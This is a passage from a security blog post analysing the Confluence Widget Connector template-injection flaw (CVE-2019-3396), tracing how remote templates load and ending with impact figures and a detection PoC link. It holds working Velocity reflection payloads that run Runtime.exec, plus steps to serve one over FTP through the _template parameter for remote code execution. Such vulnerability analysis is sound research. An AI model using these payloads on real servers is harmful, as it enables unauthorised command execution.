<p>After the previous splice <code>/WEB-INF/classes</code> acquisition failed,Keep going.</p>
<p><img src="15.png" alt=""></p>
<p>Follow the <code>findResource</code>, the previous process still fails to get.</p>
<p><img src="16.png" alt=""></p>
<p>The key point is here, it will call <code>super.findResource(name)</code>, which returns the URL, which is the object that can be obtained.</p>
<p><img src="17.png" alt=""></p>
<p>Moreover,other protocols (https, ftp, etc.) can also be used to get remote objects, meaning that remote objects can be loaded.</p>
<p><img src="18.png" alt=""></p>
<p>After getting the URL object, continue back to the previous <code>getResourceAsStream</code>, you can see that when the returned url is not null.</p>
<p>The <code>url.openStream()</code> will be called to get the data.</p>
<p><img src="19.png" alt=""></p>
<p>Finally get the data to Velocity rendering.</p>
<p>try it</p>
<p><img src="20.png" alt=""></p>
<p>As for the reason why 6.14.1 can’t work, we don’t know the reason yet, and we will follow up later.If there are new discoveries, it will be updated here, and currently only see <code>ClassLoader</code> is different.</p>
<p>6.14.1</p>
<p><img src="22.png" alt=""></p>
<p>6.9.0</p>
<p><img src="21.png" alt=""></p>
<p>The relationship between these two loaders is as follows.</p>
<p><img src="25.png" alt=""></p>
<p>Now you can load local and remote templates and try RCE.</p>
<p>Regarding Velocity’s RCE, basically the payload is derived from the topic of blackhat’s server template injection in 2015, but it can’t be used on Confluence, because it will pass <code>velocity-htmlsafe-1.5.1.jar</code> when calling the method. Some filtering and restrictions. But you can still use reflection to execute commands.</p>
<p>payload:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#set($exp=&quot;test&quot;)$exp.getClass().forName(&quot;java.lang.Runtime&quot;).getMethod(&quot;getRuntime&quot;,null).invoke(null,null).exec(&quot;calc&quot;))</span><br></pre></td></tr></table></figure>
<p>Open a simple ftp server with <code>python -m pyftpdlib -p 2121</code>, save the payload as rce.vm, and save it in the current directory.</p>
<p>Set <code>_template</code> to <code>ftp://localhost:2121/rce.vm</code>, send it, and execute the command successfully.。</p>
<p><img src="23.png" alt=""></p>
<p>For the echo of the command execution result, you can also use java reflection to construct the payload, here is the result of executing the ipconfig command.</p>
<p>payload:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#set ($exp=&quot;test&quot;)</span><br><span class="line">#set ($a=$exp.getClass().forName(&quot;java.lang.Runtime&quot;).getMethod(&quot;getRuntime&quot;,null).invoke(null,null).exec($command))</span><br><span class="line">#set ($input=$exp.getClass().forName(&quot;java.lang.Process&quot;).getMethod(&quot;getInputStream&quot;).invoke($a))</span><br><span class="line">#set($sc = $exp.getClass().forName(&quot;java.util.Scanner&quot;))</span><br><span class="line">#set($constructor = $sc.getDeclaredConstructor($exp.getClass().forName(&quot;java.io.InputStream&quot;)))</span><br><span class="line">#set($scan=$constructor.newInstance($input).useDelimiter(&quot;\\A&quot;))</span><br><span class="line">#if($scan.hasNext())</span><br><span class="line">    $scan.next()</span><br><span class="line">#end</span><br></pre></td></tr></table></figure>
<p><img src="24.png" alt=""></p>
<h3 id="Vulnerability-impact"><a href="#Vulnerability-impact" class="headerlink" title="Vulnerability impact"></a>Vulnerability impact</h3><p>According to the ZoomEye cyberspace search engine, the keyword “X-Confluence” was searched, and a total of 61,856 results were obtained, mainly distributed in the United States, Germany, China and other countries.</p>
<p><img src="26.png" alt=""></p>
<p>Global distribution (non-vulnerability impact range)</p>
<p><img src="27.png" alt=""></p>
<p><img src="28.png" alt=""></p>
<p>China distribution (non-vulnerability scope)</p>
<p><img src="29.png" alt=""></p>
<h3 id="Vulnerability-detection"><a href="#Vulnerability-detection" class="headerlink" title="Vulnerability detection"></a>Vulnerability detection</h3><p> On April 4, 2019, Knownsec 404 Team published the detection <a href="https://github.com/knownsec/pocsuite3/blob/master/pocsuite3/pocs/20190404_WEB_Confluence_path_traversal.py" target="_blank" rel="noopener">PoC</a> for this vulnerability, which can be used to detect whether Confluence is affected by the vulnerability.<img src="30.png" alt=""></p>
<p>In addition, we have released two demo videos.</p>
<p><a href="https://www.youtube.com/watch?v=TzS5wEoHMgM" target="_blank" rel="noopener">Video 1</a></p>
<p><a href="https://www.youtube.com/watch?v=orT8o_g2a6c" target="_blank" rel="noopener">Video 2</a></p>
<h3 id="Reference-link"><a href="#Reference-link" class="headerlink" title="Reference link"></a>Reference link</h3><ul>
<li><a href="https://github.com/knownsec/pocsuite3/blob/master/pocsuite3/pocs/20190404_WEB_Confluence_path_traversal.py" target="_blank" rel="noopener">PoC</a></li>
<li><a href="https://jira.atlassian.com/browse/CONFSERVER-57974" target="_blank" rel="noopener">Remote code execution via Widget Connector macro - CVE-2019-3396</a></li>
<li><a href="https://www.freebuf.com/news/200183.html" target="_blank" rel="noopener">漏洞预警 | Confluence Server 远程代码执行漏洞</a></li>
</ul>

      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      
        <div class="post-tags">
          
            <a href="/tags/JAVA/" rel="tag"># JAVA</a>
          
        </div>
      

      
      
      

      
        <div class="post-nav">
          <div class="post-nav-next post-nav-item">
            
              <a href="/2019/04/10/Confluence-未授权RCE-CVE-2019-3396-漏洞分析/" rel="next" title="Confluence 未授权RCE(CVE-2019-3396)漏洞分析">
                <i class="fa fa-chevron-left"></i> Confluence 未授权RCE(CVE-2019-3396)漏洞分析
              </a>
            
          </div>

          <span class="post-nav-divider"></span>

          <div class="post-nav-prev post-nav-item">
            
          </div>
        </div>
      

      
      
    </footer>
  </div>
  
  
  
  </article>



    <div class="post-spread">
      
    </div>
  </div>


          </div>
          


          

  



        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
    <div class="sidebar-inner">

      

      
        <ul class="sidebar-nav motion-element">
          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
            文章目录
          </li>
          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
            站点概览
          </li>
        </ul>
      

      <section class="site-overview-wrap sidebar-panel">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
            
              <p class="site-author-name" itemprop="name">Badcode</p>
              <p class="site-description motion-element" itemprop="description">学习经历</p>
          </div>

          <nav class="site-state motion-element">

            
              <div class="site-state-item site-state-posts">
              
                <a href="/archives/">
              
                  <span class="site-state-item-count">16</span>
                  <span class="site-state-item-name">日志</span>
                </a>
              </div>
            

            

            
              
              
              <div class="site-state-item site-state-tags">
                
                  <span class="site-state-item-count">4</span>
                  <span class="site-state-item-name">标签</span>
                
              </div>
            

          </nav>

          

          <div class="links-of-author motion-element">
            
          </div>

          
          

          
          

          

        </div>
      </section>

      
      <!--noindex-->
        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
          <div class="post-toc">

            
              
            

            
              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#Vulnerability-impact"><span class="nav-number">1.</span> <span class="nav-text">Vulnerability impact</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Vulnerability-detection"><span class="nav-number">2.</span> <span class="nav-text">Vulnerability detection</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Reference-link"><span class="nav-number">3.</span> <span class="nav-text">Reference link</span></a></li></ol></div>
            

          </div>
        </section>
      <!--/noindex-->
      

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
  <span class="with-love">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">Badcode</span>

  
</div>


  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>



  <span class="post-meta-divider">|</span>



  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Muse</a> v5.1.3</div>




        







        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
      </div>
    

    

  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  












  
  
    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
  

  
  
    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
  

  
  
    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
  


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.3"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.3"></script>



  
  

  
  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.3"></script>
<script type="text/javascript" src="/js/src/post-details.js?v=5.1.3"></script>



  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.3"></script>



  


  




	





  





  












  





  

  

  

  
  

  

  

  

</body>
</html>
